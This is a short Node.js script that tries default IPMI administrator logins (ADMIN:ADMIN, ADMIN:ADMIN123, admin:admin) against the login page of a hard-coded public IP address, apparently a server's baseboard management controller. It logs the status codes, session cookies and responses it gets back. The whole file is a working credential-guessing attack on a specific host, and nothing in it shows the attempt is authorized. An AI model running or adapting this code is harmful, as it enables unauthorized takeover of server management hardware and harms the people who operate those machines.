const http = require('http');
const querystring = require('querystring');

function testIpmiCredentials(username, password) {
    const postData = querystring.stringify({
        'name': username,
        'pwd': password
    });

    const options = {
        hostname: '115.135.158.84',
        port: 9000,
        path: '/cgi/login.cgi',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = http.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
            console.log(`\n=== CREDENTIAL TEST [${username}:${password}] ===`);
            console.log('Status Code:', res.statusCode);
            console.log('Set-Cookie:', res.headers['set-cookie']);
            console.log('Response Body:', data);
        });
    });

    req.on('error', (e) => {
        console.error(`IPMI Error [${username}]: ${e.message}`);
    });

    req.write(postData);
    req.end();
}

testIpmiCredentials('ADMIN', 'ADMIN');
setTimeout(() => testIpmiCredentials('ADMIN', 'ADMIN123'), 1500);
setTimeout(() => testIpmiCredentials('admin', 'admin'), 3000);
